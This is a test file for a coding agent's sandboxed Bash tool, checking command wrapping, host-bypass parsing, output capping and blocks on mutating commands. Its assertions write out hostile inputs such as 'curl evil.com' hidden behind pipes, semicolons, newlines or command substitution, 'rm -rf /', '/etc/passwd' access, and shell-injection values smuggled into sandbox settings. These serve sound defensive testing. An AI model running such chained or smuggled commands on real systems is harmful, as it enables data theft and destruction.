import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { afterEach, describe, expect, it } from "vitest";
import {
  BashTool,
  capCommandOutput,
  getSandboxMutationBlockReason,
  getSandboxSettingsError,
  normalizeBashTimeout,
  parseStandaloneCd,
  shouldRunOnHostInSandboxMode,
  wrapCommandForShuru,
  wrapHostBrowserCommand,
} from "./bash";

const tempDirs: string[] = [];

function makeTempDir(prefix: string): string {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), prefix));
  tempDirs.push(dir);
  return dir;
}

afterEach(() => {
  for (const dir of tempDirs.splice(0)) {
    fs.rmSync(dir, { recursive: true, force: true });
  }
});

describe("wrapCommandForShuru", () => {
  it("wraps a simple command with mount and workspace cd", () => {
    const result = wrapCommandForShuru("/repo", "echo hi");
    expect(result).toBe("shuru run --mount '/repo:/workspace' -- sh -lc 'cd /workspace && echo hi'");
  });

  it("handles paths with spaces", () => {
    const result = wrapCommandForShuru("/my repo", "ls");
    expect(result).toBe("shuru run --mount '/my repo:/workspace' -- sh -lc 'cd /workspace && ls'");
  });

  it("escapes single quotes in the command", () => {
    const result = wrapCommandForShuru("/repo", "echo 'hello world'");
    expect(result).toContain("'\\''hello world'\\''");
  });

  it("includes --allow-net when allowNet is true", () => {
    const result = wrapCommandForShuru("/repo", "curl example.com", { allowNet: true });
    expect(result).toContain("--allow-net");
    expect(result).toContain("--mount '/repo:/workspace'");
  });

  it("includes --allow-host flags for each allowed host", () => {
    const result = wrapCommandForShuru("/repo", "curl api.openai.com", {
      allowNet: true,
      allowedHosts: ["api.openai.com", "registry.npmjs.org"],
    });
    expect(result).toContain("--allow-net");
    expect(result).toContain("--allow-host 'api.openai.com'");
    expect(result).toContain("--allow-host 'registry.npmjs.org'");
  });

  it("includes port forwards", () => {
    const result = wrapCommandForShuru("/repo", "python -m http.server", { ports: ["8080:8000", "8443:443"] });
    expect(result).toContain("-p '8080:8000'");
    expect(result).toContain("-p '8443:443'");
  });

  it("includes resource limits", () => {
    const result = wrapCommandForShuru("/repo", "make -j4", { cpus: 4, memory: 4096, diskSize: 8192 });
    expect(result).toContain("--cpus '4'");
    expect(result).toContain("--memory '4096'");
    expect(result).toContain("--disk-size '8192'");
  });

  it("includes --from checkpoint flag", () => {
    const result = wrapCommandForShuru("/repo", "python script.py", { from: "py-env" });
    expect(result).toContain("--from 'py-env'");
  });

  it("includes --secret flags", () => {
    const result = wrapCommandForShuru("/repo", "curl https://api.openai.com", {
      allowNet: true,
      secrets: [{ name: "API_KEY", fromEnv: "OPENAI_API_KEY", hosts: ["api.openai.com"] }],
    });
    expect(result).toContain("--secret 'API_KEY=OPENAI_API_KEY@api.openai.com'");
  });

  it("combines multiple settings correctly", () => {
    const result = wrapCommandForShuru("/repo", "echo hi", {
      allowNet: true,
      allowedHosts: ["example.com"],
      cpus: 2,
      from: "base",
    });
    expect(result).toMatch(/^shuru run --cpus '2' --allow-net --allow-host 'example\.com' --from 'base' --mount/);
  });

  it("passes every interpolated setting to shuru as a single argument, never as shell syntax", async () => {
    const dir = makeTempDir("shuru-argv-");
    const marker = path.join(dir, "pwned");
    const argvFile = path.join(dir, "argv");
    // Stand-in `shuru` that records the argv it receives, one per line.
    fs.writeFileSync(
      path.join(dir, "shuru"),
      `#!/bin/sh\nfor a in "$@"; do printf '%s\\n' "$a"; done > '${argvFile}'\n`,
      {
        mode: 0o755,
      },
    );
    const hostile = `img'; touch ${marker}; echo '`;
    const wrapped = wrapCommandForShuru("/repo", "true", {
      from: hostile,
      allowedHosts: [`h$(touch ${marker})`],
      ports: [`1:2;touch ${marker}`],
      secrets: [{ name: `N;touch ${marker}`, fromEnv: "E", hosts: ["x`touch z`"] }],
    });
    const { execFileSync } = await import("node:child_process");
    execFileSync("sh", ["-c", wrapped], { env: { ...process.env, PATH: `${dir}:${process.env.PATH}` } });
    expect(fs.existsSync(marker)).toBe(false);
    const argv = fs.readFileSync(argvFile, "utf8").split("\n");
    expect(argv).toContain(hostile);
    expect(argv).toContain(`h$(touch ${marker})`);
    expect(argv).toContain(`1:2;touch ${marker}`);
  });

  it("uses default empty settings when none provided", () => {
    const result = wrapCommandForShuru("/repo", "echo hi", {});
    expect(result).toBe("shuru run --mount '/repo:/workspace' -- sh -lc 'cd /workspace && echo hi'");
  });
});

describe("shouldRunOnHostInSandboxMode", () => {
  it("keeps agent-browser on the host when enabled", () => {
    expect(
      shouldRunOnHostInSandboxMode("agent-browser open http://127.0.0.1:3000", { hostBrowserCommandsOnHost: true }),
    ).toBe(true);
    expect(
      shouldRunOnHostInSandboxMode("npx agent-browser screenshot out.png", { hostBrowserCommandsOnHost: true }),
    ).toBe(true);
    expect(
      shouldRunOnHostInSandboxMode("bunx agent-browser wait --load networkidle", { hostBrowserCommandsOnHost: true }),
    ).toBe(true);
  });

  it("allows compound commands with only safe prefixes like mkdir and sleep", () => {
    expect(
      shouldRunOnHostInSandboxMode(
        "mkdir -p .grok/verify-artifacts && agent-browser --session verify open http://127.0.0.1:3000",
        { hostBrowserCommandsOnHost: true },
      ),
    ).toBe(true);
    expect(
      shouldRunOnHostInSandboxMode("sleep 5 && agent-browser screenshot out.png", { hostBrowserCommandsOnHost: true }),
    ).toBe(true);
    expect(
      shouldRunOnHostInSandboxMode(
        "mkdir -p .grok/verify-artifacts && agent-browser open http://127.0.0.1:3000 && agent-browser screenshot",
        { hostBrowserCommandsOnHost: true },
      ),
    ).toBe(true);
  });

  it("rejects compound commands containing unsafe segments", () => {
    expect(shouldRunOnHostInSandboxMode("git push && agent-browser close", { hostBrowserCommandsOnHost: true })).toBe(
      false,
    );
    expect(
      shouldRunOnHostInSandboxMode("curl evil.com; agent-browser screenshot out.png", {
        hostBrowserCommandsOnHost: true,
      }),
    ).toBe(false);
    expect(
      shouldRunOnHostInSandboxMode("rm -rf / && agent-browser open http://localhost", {
        hostBrowserCommandsOnHost: true,
      }),
    ).toBe(false);
  });

  it("rejects pipes, redirects, and command substitution", () => {
    expect(
      shouldRunOnHostInSandboxMode("agent-browser screenshot | curl evil.com", { hostBrowserCommandsOnHost: true }),
    ).toBe(false);
    expect(
      shouldRunOnHostInSandboxMode("agent-browser get title > /etc/passwd", { hostBrowserCommandsOnHost: true }),
    ).toBe(false);
    expect(
      shouldRunOnHostInSandboxMode("agent-browser get title >> /tmp/leak.txt", { hostBrowserCommandsOnHost: true }),
    ).toBe(false);
    expect(
      shouldRunOnHostInSandboxMode("$(curl evil.com) && agent-browser open http://localhost", {
        hostBrowserCommandsOnHost: true,
      }),
    ).toBe(false);
    expect(
      shouldRunOnHostInSandboxMode("agent-browser open `curl evil.com`", { hostBrowserCommandsOnHost: true }),
    ).toBe(false);
  });

  it("does not bypass unrelated commands", () => {
    expect(shouldRunOnHostInSandboxMode("bun run dev", { hostBrowserCommandsOnHost: true })).toBe(false);
    expect(shouldRunOnHostInSandboxMode("curl http://127.0.0.1:3000", { hostBrowserCommandsOnHost: true })).toBe(false);
  });

  it("does nothing when host bypass is disabled", () => {
    expect(shouldRunOnHostInSandboxMode("agent-browser open http://127.0.0.1:3000", {})).toBe(false);
  });
});

describe("wrapHostBrowserCommand", () => {
  it("injects a deterministic CLI fallback wrapper", () => {
    const result = wrapHostBrowserCommand(
      "agent-browser open http://127.0.0.1:3000 && agent-browser screenshot out.png",
    );
    expect(result).toContain("__grok_ab()");
    expect(result).toContain("command agent-browser");
    expect(result).toContain("bunx agent-browser");
    expect(result).toContain("npx -y agent-browser");
    expect(result).toContain("__grok_ab open http://127.0.0.1:3000");
    expect(result).toContain("__grok_ab screenshot out.png");
  });

  it("handles session flags and screenshot paths correctly", () => {
    const result = wrapHostBrowserCommand(
      "agent-browser --session verify screenshot .grok/verify-artifacts/verify-smoke-home.png",
    );
    expect(result).toContain("__grok_ab --session verify screenshot .grok/verify-artifacts/verify-smoke-home.png");
  });
});

describe("tryParseRipgrepCommand", () => {
  it("parses simple pattern and optional path", async () => {
    const { tryParseRipgrepCommand } = await import("./bash");
    expect(tryParseRipgrepCommand("rg foo")).toEqual({ pattern: "foo" });
    expect(tryParseRipgrepCommand("rg 'foo bar' src")).toEqual({ pattern: "foo bar", path: "src" });
    expect(tryParseRipgrepCommand('rg "foo" ./lib')).toEqual({ pattern: "foo", path: "./lib" });
  });

  it("accepts --glob= and -g include filters", async () => {
    const { tryParseRipgrepCommand } = await import("./bash");
    expect(tryParseRipgrepCommand("rg --glob=*.ts pattern")).toEqual({
      pattern: "pattern",
      include: "*.ts",
    });
    expect(tryParseRipgrepCommand("rg -g *.tsx pattern src")).toEqual({
      pattern: "pattern",
      path: "src",
      include: "*.tsx",
    });
  });

  it("accepts known no-op flags and rejects unknown flags", async () => {
    const { tryParseRipgrepCommand } = await import("./bash");
    expect(tryParseRipgrepCommand("rg -nH pattern")).toEqual({ pattern: "pattern" });
    expect(tryParseRipgrepCommand("rg --hidden --no-messages pattern")).toEqual({ pattern: "pattern" });
    expect(tryParseRipgrepCommand("rg -i pattern")).toBeNull();
    expect(tryParseRipgrepCommand("rg -A 3 pattern")).toBeNull();
    expect(tryParseRipgrepCommand("rg --type ts pattern")).toBeNull();
  });

  it("refuses shell operators and multi-path invocations", async () => {
    const { tryParseRipgrepCommand } = await import("./bash");
    expect(tryParseRipgrepCommand("rg foo | head")).toBeNull();
    expect(tryParseRipgrepCommand("rg foo && true")).toBeNull();
    expect(tryParseRipgrepCommand("rg foo; rm -rf /")).toBeNull();
    expect(tryParseRipgrepCommand("rg foo $(echo bar)")).toBeNull();
    expect(tryParseRipgrepCommand("rg pattern a b")).toBeNull();
    expect(tryParseRipgrepCommand("grep pattern")).toBeNull();
  });
});

describe("getSandboxSettingsError", () => {
  it("accepts ordinary settings", () => {
    expect(
      getSandboxSettingsError({
        cpus: 2,
        memory: 4096,
        allowedHosts: ["api.openai.com", "*.npmjs.org", "localhost:3000"],
        ports: ["8080:8000"],
        secrets: [{ name: "API_KEY", fromEnv: "OPENAI_API_KEY", hosts: ["api.openai.com"] }],
        from: "ghcr.io/org/img:1.2@sha256-abc",
      }),
    ).toBeNull();
  });

  it("rejects values that are not a plain host, port mapping, env name or image", () => {
    expect(getSandboxSettingsError({ allowedHosts: ["a.com; rm -rf ~"] })).toContain("allowedHosts");
    expect(getSandboxSettingsError({ ports: ["8080"] })).toContain("ports");
    expect(getSandboxSettingsError({ secrets: [{ name: "K", fromEnv: "A B", hosts: [] }] })).toContain("fromEnv");
    expect(getSandboxSettingsError({ from: "x'y" })).toContain("from");
    expect(getSandboxSettingsError({ cpus: Number.NaN })).toContain("cpus");
  });

  it("refuses to run a sandboxed command with invalid settings", async () => {
    const bash = new BashTool(makeTempDir("sandbox-invalid-"), {
      sandboxMode: "shuru",
      sandboxSettings: { from: "x'; touch /tmp/nope; '" },
    });
    const result = await bash.execute("true");
    expect(result.success).toBe(false);
    if (process.platform === "darwin" && process.arch === "arm64") {
      expect(result.error).toContain("Invalid sandbox setting from");
    }
  });
});

describe("normalizeBashTimeout", () => {
  it("never disables the timeout and clamps to [1s, 10min]", () => {
    expect(normalizeBashTimeout(undefined)).toBe(30_000);
    expect(normalizeBashTimeout(0)).toBe(30_000);
    expect(normalizeBashTimeout(-5)).toBe(30_000);
    expect(normalizeBashTimeout(Number.NaN)).toBe(30_000);
    expect(normalizeBashTimeout(Number.POSITIVE_INFINITY)).toBe(30_000);
    expect(normalizeBashTimeout(10)).toBe(1_000);
    expect(normalizeBashTimeout(5_000)).toBe(5_000);
    expect(normalizeBashTimeout(24 * 3600_000)).toBe(600_000);
  });
});

describe("capCommandOutput", () => {
  it("returns small output unchanged", () => {
    expect(capCommandOutput("hello", 100)).toBe("hello");
  });

  it("keeps head and tail and marks the elided middle", () => {
    const text = `HEAD${"x".repeat(1000)}TAIL`;
    const capped = capCommandOutput(text, 100);
    expect(capped.startsWith("HEAD")).toBe(true);
    expect(capped.endsWith("TAIL")).toBe(true);
    expect(capped).toContain("[... truncated: 1,008 bytes total");
    expect(Buffer.byteLength(capped)).toBeLessThan(400);
  });

  it("bounds what a foreground command returns", async () => {
    const bash = new BashTool(makeTempDir("bash-cap-"));
    const result = await bash.execute("head -c 2000000 /dev/zero | tr '\\0' a", 20_000);
    expect(result.success).toBe(true);
    expect(Buffer.byteLength(result.output ?? "")).toBeLessThan(600 * 1024);
    expect(result.output).toContain("[... truncated: 2,000,000 bytes total");
  });
});

describe("parseStandaloneCd", () => {
  it("expands a leading ~ and $HOME like the shell does", () => {
    const home = os.homedir();
    expect(parseStandaloneCd("cd ~")).toBe(home);
    expect(parseStandaloneCd("cd ~/src")).toBe(path.join(home, "src"));
    expect(parseStandaloneCd("cd $HOME/src")).toBe(path.join(home, "src"));
    // biome-ignore lint/suspicious/noTemplateCurlyInString: shell syntax under test
    expect(parseStandaloneCd('cd "${HOME}/my dir"')).toBe(path.join(home, "my dir"));
    // Quoted ~ and single-quoted $HOME are literal in the shell.
    expect(parseStandaloneCd('cd "~/src"')).toBe("~/src");
    expect(parseStandaloneCd("cd '$HOME'")).toBe("$HOME");
    expect(parseStandaloneCd("cd ~other")).toBe("~other");
  });

  it("recognises only a complete standalone cd invocation", () => {
    expect(parseStandaloneCd("cd src")).toBe("src");
    expect(parseStandaloneCd("  cd ../lib  ")).toBe("../lib");
    expect(parseStandaloneCd('cd "my dir"')).toBe("my dir");
    expect(parseStandaloneCd("cd 'my dir'")).toBe("my dir");
    expect(parseStandaloneCd("cd my\\ dir")).toBe("my dir");
  });

  it("defers compound shell programs to the shell", () => {
    expect(parseStandaloneCd("cd src && make")).toBeNull();
    expect(parseStandaloneCd("cd src; ls")).toBeNull();
    expect(parseStandaloneCd("cd src || exit 1")).toBeNull();
    expect(parseStandaloneCd("cd src | cat")).toBeNull();
    expect(parseStandaloneCd("cd src > out.txt")).toBeNull();
    expect(parseStandaloneCd("cd $(git rev-parse --show-toplevel)")).toBeNull();
    expect(parseStandaloneCd("cd `pwd`")).toBeNull();
    expect(parseStandaloneCd("cd src\nls")).toBeNull();
  });

  it("does not intercept cd with zero or several arguments, or other commands", () => {
    expect(parseStandaloneCd("cd")).toBeNull();
    expect(parseStandaloneCd("cd a b")).toBeNull();
    expect(parseStandaloneCd("cdx src")).toBeNull();
    expect(parseStandaloneCd("echo cd src")).toBeNull();
    expect(parseStandaloneCd('cd "unterminated')).toBeNull();
  });
});

describe("getSandboxMutationBlockReason", () => {
  it("returns null for read-only git commands", () => {
    expect(getSandboxMutationBlockReason("git status")).toBeNull();
    expect(getSandboxMutationBlockReason("git diff")).toBeNull();
    expect(getSandboxMutationBlockReason("git log --oneline")).toBeNull();
    expect(getSandboxMutationBlockReason("git show HEAD")).toBeNull();
    expect(getSandboxMutationBlockReason("git rev-parse HEAD")).toBeNull();
    expect(getSandboxMutationBlockReason("git grep foo")).toBeNull();
    expect(getSandboxMutationBlockReason("git ls-files")).toBeNull();
  });

  it("blocks mutating git commands", () => {
    expect(getSandboxMutationBlockReason("git add .")).toContain("Sandbox mode blocks git commands");
    expect(getSandboxMutationBlockReason("git commit -m 'test'")).toContain("Sandbox mode blocks git commands");
    expect(getSandboxMutationBlockReason("git push")).toContain("Sandbox mode blocks git commands");
    expect(getSandboxMutationBlockReason("git checkout -b new")).toContain("Sandbox mode blocks git commands");
  });

  it("blocks git inside compound shell expressions", () => {
    expect(getSandboxMutationBlockReason('echo foo && git commit -m "test"')).toContain(
      "Sandbox mode blocks git commands",
    );
    expect(getSandboxMutationBlockReason('bash -c "git push"')).toContain("Sandbox mode blocks git commands");
  });

  it("blocks git branch since it can mutate", () => {
    expect(getSandboxMutationBlockReason("git branch -D feature")).toContain("Sandbox mode blocks git commands");
    expect(getSandboxMutationBlockReason("git branch new-name")).toContain("Sandbox mode blocks git commands");
  });

  it("blocks package-manager installs", () => {
    expect(getSandboxMutationBlockReason("npm install express")).toContain("Package-manager installs");
    expect(getSandboxMutationBlockReason("yarn add lodash")).toContain("Package-manager installs");
    expect(getSandboxMutationBlockReason("pnpm install")).toContain("Package-manager installs");
    expect(getSandboxMutationBlockReason("bun add zod")).toContain("Package-manager installs");
  });

  it("allows package-manager installs when ephemeral installs are enabled", () => {
    expect(getSandboxMutationBlockReason("npm install express", { allowEphemeralInstall: true })).toBeNull();
    expect(getSandboxMutationBlockReason("pnpm install", { allowEphemeralInstall: true })).toBeNull();
    expect(getSandboxMutationBlockReason("pip install fastapi", { allowEphemeralInstall: true })).toBeNull();
  });

  it("blocks package-manager installs in compound commands", () => {
    expect(getSandboxMutationBlockReason("echo foo && npm install express")).toContain("Package-manager installs");
  });

  it("blocks formatters that rewrite files", () => {
    expect(getSandboxMutationBlockReason("prettier --write src/")).toContain("formatters");
    expect(getSandboxMutationBlockReason("biome check --write src/")).toContain("formatters");
  });

  it("allows safe non-mutating commands", () => {
    expect(getSandboxMutationBlockReason("ls -la")).toBeNull();
    expect(getSandboxMutationBlockReason("cat README.md")).toBeNull();
    expect(getSandboxMutationBlockReason("grep -r foo src/")).toBeNull();
    expect(getSandboxMutationBlockReason("uname -a")).toBeNull();
    expect(getSandboxMutationBlockReason("npm run test")).toBeNull();
    expect(getSandboxMutationBlockReason("node -e 'console.log(1)'")).toBeNull();
  });

  it("returns null for empty commands", () => {
    expect(getSandboxMutationBlockReason("")).toBeNull();
    expect(getSandboxMutationBlockReason("   ")).toBeNull();
  });
});

describe("BashTool sandbox state", () => {
  it("tracks cwd changes independently of sandbox mode", () => {
    const root = makeTempDir("grok-bash-test-");
    const nested = path.join(root, "nested");
    fs.mkdirSync(nested);
    const bash = new BashTool(root, { sandboxMode: "shuru" });

    expect(bash.getCwd()).toBe(root);
    expect(bash.getSandboxMode()).toBe("shuru");
  });

  it("can switch sandbox mode at runtime", () => {
    const bash = new BashTool("/repo", { sandboxMode: "off" });

    expect(bash.getSandboxMode()).toBe("off");

    bash.setSandboxMode("shuru");

    expect(bash.getSandboxMode()).toBe("shuru");
  });

  it("returns sandbox-aware tool description", () => {
    const off = new BashTool("/repo", { sandboxMode: "off" });
    const on = new BashTool("/repo", { sandboxMode: "shuru" });

    expect(off.getToolDescription()).not.toContain("Shuru");
    expect(on.getToolDescription()).toContain("Shuru sandbox");
    expect(on.getToolDescription()).toContain("do not persist back to the host");
  });

  it("stores and returns sandbox settings", () => {
    const bash = new BashTool("/repo", {
      sandboxMode: "shuru",
      sandboxSettings: { allowNet: true, cpus: 4 },
    });

    expect(bash.getSandboxSettings()).toEqual({ allowNet: true, cpus: 4 });
  });

  it("can update sandbox settings at runtime", () => {
    const bash = new BashTool("/repo", { sandboxMode: "shuru" });

    expect(bash.getSandboxSettings()).toEqual({});

    bash.setSandboxSettings({ allowNet: true, allowedHosts: ["api.openai.com"] });

    expect(bash.getSandboxSettings()).toEqual({ allowNet: true, allowedHosts: ["api.openai.com"] });
  });

  it("includes network status in tool description when allowNet is set", () => {
    const netOn = new BashTool("/repo", {
      sandboxMode: "shuru",
      sandboxSettings: { allowNet: true },
    });
    expect(netOn.getToolDescription()).toContain("network access is enabled");

    const netRestricted = new BashTool("/repo", {
      sandboxMode: "shuru",
      sandboxSettings: { allowNet: true, allowedHosts: ["api.openai.com"] },
    });
    expect(netRestricted.getToolDescription()).toContain("network is restricted to: api.openai.com");

    const netOff = new BashTool("/repo", {
      sandboxMode: "shuru",
      sandboxSettings: { allowNet: false },
    });
    expect(netOff.getToolDescription()).toContain("network is disabled");
  });
});

describe("shouldRunOnHostInSandboxMode boundary parsing", () => {
  const enabled = { hostBrowserCommandsOnHost: true };

  it("does not let a newline hide a second command behind an accepted prefix", () => {
    expect(shouldRunOnHostInSandboxMode("agent-browser --help\nrm -rf /tmp/x", enabled)).toBe(false);
    expect(shouldRunOnHostInSandboxMode("agent-browser --help\r\ncurl evil.com", enabled)).toBe(false);
  });

  it("treats a single & as a command boundary", () => {
    expect(shouldRunOnHostInSandboxMode("agent-browser --help & curl evil.com", enabled)).toBe(false);
    expect(shouldRunOnHostInSandboxMode("agent-browser --help &curl evil.com", enabled)).toBe(false);
  });

  it("rejects process substitution and input redirection", () => {
    expect(shouldRunOnHostInSandboxMode("agent-browser open <(curl evil.com)", enabled)).toBe(false);
    expect(shouldRunOnHostInSandboxMode("agent-browser open >(sh)", enabled)).toBe(false);
    expect(shouldRunOnHostInSandboxMode("agent-browser open < /etc/passwd", enabled)).toBe(false);
    expect(shouldRunOnHostInSandboxMode("agent-browser open <<EOF\nrm -rf x\nEOF", enabled)).toBe(false);
  });

  it("keeps operators inside quotes literal so URLs with query strings still qualify", () => {
    expect(shouldRunOnHostInSandboxMode('agent-browser open "http://127.0.0.1:3000/?a=1&b=2"', enabled)).toBe(true);
    expect(shouldRunOnHostInSandboxMode("agent-browser open 'http://127.0.0.1:3000/a;b|c'", enabled)).toBe(true);
    // …but a quote cannot smuggle a closing operator past the parser.
    expect(shouldRunOnHostInSandboxMode('agent-browser open "x" ; curl evil.com', enabled)).toBe(false);
  });

  it("refuses commands with unbalanced quotes rather than guessing", () => {
    expect(shouldRunOnHostInSandboxMode('agent-browser open "http://x', enabled)).toBe(false);
  });

  it("still accepts plain agent-browser invocations and allowed companions", () => {
    expect(shouldRunOnHostInSandboxMode("agent-browser open http://127.0.0.1:3000 ; sleep 1", enabled)).toBe(true);
    expect(shouldRunOnHostInSandboxMode("echo starting && agent-browser screenshot out.png", enabled)).toBe(true);
    expect(shouldRunOnHostInSandboxMode("agent-browser open http://x \\\n  --wait", enabled)).toBe(true);
  });
});
